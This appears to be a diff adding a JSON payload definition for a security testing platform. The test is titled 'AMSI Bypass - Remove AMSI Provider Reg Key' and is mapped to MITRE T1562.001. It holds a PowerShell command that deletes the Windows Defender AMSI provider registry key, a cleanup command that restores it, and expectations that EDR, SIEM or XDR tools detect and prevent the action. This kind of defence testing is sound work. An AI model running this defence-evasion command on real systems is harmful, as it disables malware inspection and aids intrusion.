@@ -1,0 +1,39 @@
+{
+  "command_content": "Remove-Item -Path \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\{2781761E-28E0-4109-99FE-B9D127C57AFE}\" -Recurse\n",
+  "command_executor": "psh",
+  "payload_attack_patterns": [
+    "T1562.001"
+  ],
+  "payload_cleanup_command": "New-Item -Path \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\" -Name \"{2781761E-28E0-4109-99FE-B9D127C57AFE}\" -ErrorAction Ignore | Out-Null\n",
+  "payload_cleanup_executor": "psh",
+  "payload_description": "With administrative rights, an adversary can remove the AMSI Provider registry key in HKLM\\Software\\Microsoft\\AMSI to disable AMSI inspection.\nThis test removes the Windows Defender provider registry key. Upon execution, no output is displayed.\nOpen Registry Editor and navigate to \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\\" to verify that it is gone.\n",
+  "payload_domains": [
+    {
+      "domain_color": "#389CFF",
+      "domain_name": "Endpoint"
+    }
+  ],
+  "payload_elevation_required": true,
+  "payload_execution_arch": "ALL_ARCHITECTURES",
+  "payload_expectations": [
+    "DETECTION",
+    "PREVENTION"
+  ],
+  "payload_expected_security_platforms": {
+    "DETECTION": [
+      "EDR",
+      "SIEM",
+      "XDR"
+    ],
+    "PREVENTION": [
+      "EDR",
+      "XDR"
+    ]
+  },
+  "payload_external_id": "13f09b91-c953-438e-845b-b585e51cac9b",
+  "payload_name": "AMSI Bypass - Remove AMSI Provider Reg Key",
+  "payload_platforms": [
+    "Windows"
+  ],
+  "payload_type": "Command"
+}
